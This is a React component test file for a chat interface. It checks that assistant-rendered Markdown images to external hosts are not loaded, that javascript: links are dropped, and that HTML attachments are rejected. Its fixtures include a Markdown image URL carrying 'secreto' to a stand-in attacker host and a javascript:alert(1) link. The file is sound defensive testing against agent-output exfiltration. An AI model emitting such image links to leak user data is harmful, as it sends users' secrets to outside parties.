import { describe, it, expect, vi, afterEach, beforeAll } from 'vitest';
import { cleanup, fireEvent, render, screen } from '@testing-library/react';
import { DailyChatInterface } from '../DailyChatInterface';
import { dailyTranslations } from '../../../config/dailyTranslations';
import type { IChatItem } from '../../../types/chat';

const t = dailyTranslations.es;

function renderChat(messages: IChatItem[] = [], onSendMessage = vi.fn()) {
  const view = render(
    <DailyChatInterface t={t} messages={messages} status="idle" error={null} onSendMessage={onSendMessage} />
  );
  return { ...view, onSendMessage };
}

function selectFiles(container: HTMLElement, files: File[]) {
  const input = container.querySelector('input[type="file"]') as HTMLInputElement;
  fireEvent.change(input, { target: { files } });
}

describe('DailyChatInterface (lote 4)', () => {
  beforeAll(() => {
    // jsdom does not implement scrollIntoView (used to follow new messages).
    Element.prototype.scrollIntoView = vi.fn();
  });

  afterEach(cleanup);

  it('does not render external Markdown images from the agent (no zero-click exfiltration)', () => {
    const { container } = renderChat([
      { id: 'a1', role: 'assistant', content: 'Mira ![dato](https://attacker.example/?q=secreto)' } as IChatItem,
    ]);

    expect(container.querySelector('img[src*="attacker.example"]')).toBeNull();
    expect(screen.getByText('[dato]')).toBeTruthy();
  });

  it('opens external links in a new tab without opener access', () => {
    const { container } = renderChat([
      { id: 'a1', role: 'assistant', content: '[docs](https://learn.microsoft.com) [mal](javascript:alert(1))' } as IChatItem,
    ]);

    const links = Array.from(container.querySelectorAll('a'));
    expect(links).toHaveLength(1);
    expect(links[0].getAttribute('target')).toBe('_blank');
    expect(links[0].getAttribute('rel')).toBe('noopener noreferrer');
  });

  it('rejects an HTML attachment with a translated message and does not send', () => {
    const { container, onSendMessage } = renderChat();

    selectFiles(container, [new File(['<b>x</b>'], 'pagina.html', { type: 'text/html' })]);
    fireEvent.change(screen.getByLabelText(t.chat.placeholder), { target: { value: 'hola' } });
    fireEvent.click(screen.getByText(t.chat.actions.send));

    expect(screen.getByRole('alert').textContent).toContain('"pagina.html": tipo no admitido');
    expect(onSendMessage).not.toHaveBeenCalled();
    expect((screen.getByLabelText(t.chat.placeholder) as HTMLTextAreaElement).value).toBe('hola');
  });

  it('restricts the file picker to supported types', () => {
    const { container } = renderChat();
    const accept = (container.querySelector('input[type="file"]') as HTMLInputElement).accept;

    expect(accept).toContain('application/pdf');
    expect(accept).not.toContain('html');
  });

  it('sends valid attachments', () => {
    const { container, onSendMessage } = renderChat();
    const pdf = new File(['%PDF-1.7'], 'caso.pdf', { type: 'application/pdf' });

    selectFiles(container, [pdf]);
    fireEvent.change(screen.getByLabelText(t.chat.placeholder), { target: { value: 'resume' } });
    fireEvent.click(screen.getByText(t.chat.actions.send));

    expect(onSendMessage).toHaveBeenCalledWith('resume', [pdf]);
  });
});
